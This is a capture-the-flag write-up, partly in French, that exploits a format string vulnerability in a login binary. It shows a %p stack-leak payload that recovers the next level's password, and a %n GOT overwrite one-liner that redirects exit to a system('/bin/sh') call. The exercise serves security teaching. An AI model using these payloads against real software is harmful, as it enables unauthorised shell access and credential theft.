The provided executable expect a username and a password.

We decompiled it and we can see the program opening the level03 password.
Trying to run the program in gdb will lead to failure because gdb doesn't have the same user level access,
so we need to operate only through the standar input.

This program use the password from of the level03 user and expect to the user to provide it in order to be get a shell with the user level03 access.

So it appear quite secure.

However we can notice that the user name is printed through a printf call if it's the wrong password. We gone use the format string vulnerability.

## First way to do it:

This attack will print the raw memory of the buffers in order to get the read password.

```bash
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
--[ Password: *****************************************
0x7fffffffe4f0.(nil).0x25.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x1002e7025.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70. does not have access!
```

We can see our patern in the output where `70252e` correspond to `p%.`
We can ignore our pattern until the string end.
The data after our payload is the password read because the memory layout of the buffers start with the password buffer followed by the read_buffer.
We also know that the maximum number of character read is 41 so we can ignore what is after.

0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00

Now we can reverse each hexadecimal chunk in order to get them back to big endian then convert it to ascii string.

```
48 75 6e 50 52 34 37 68 -> Hh74RPnu
51 45 41 4a 35 61 73 39 -> Q9sa5JAE
58 37 7a 71 43 57 4e 67 -> XgNWCqz7
73 35 4a 35 68 6e 47 58 -> sXGnh5J5
4d 48 33 67 50 66 4b 39 -> M9KfPg3H
```

The last three bytes are ignore because it correspond to the end of the string.
00 ff fe

So the password is:

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Deuxieme maniere d'y arriver:

On va utiliser printf pour ecrire dans une adresse de notre choix.
Dans notre cas , dans la fonction main on a un appel a `system "/bin/sh"`

```
0x400a85 <main+625>     mov    $0x400d32,%edi
0x400a8a <main+630>     callq  0x4006b0 <system@plt>
```

```
x/s 0x400d32
0x400d32:        "/bin/sh"
```

On notifie aussi un appel a exit plus bas dans le code

```
0x400ab1 <main+669>     mov    $0x1,%edi
0x400ab6 <main+674>     callq  0x400710 <exit@plt>
```

On va tenter de remplacer l'appel exit@plt a un appel a notre fonction main a l'adresse `0x400a85` soit en decimal 4196997

On disas exit@plt

```
disas exit
#0x601228
```

On remarque qu'en affichant les prochains octets de la stack on tombe rapidement sur le deuxieme buffer:

```bash
./level0
username: %x %x %x %x %x %x %x %x %x %x
password: AAAA
ffffe580 0 41 2a2a2a2a 2a2a2a2a ffffe778 f7ff9a08 41414141 0 0 0 0 0 0 does not have access!
```

Nous avons donc toutes les ressources necessaires pour rediriger l'execution du code vers la portion qui nous interesse:

```bash
(python -c 'print "%4196997c%8$n" + "\n" + "\x28\x12\x60"' ; cat) | ./level02
```

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
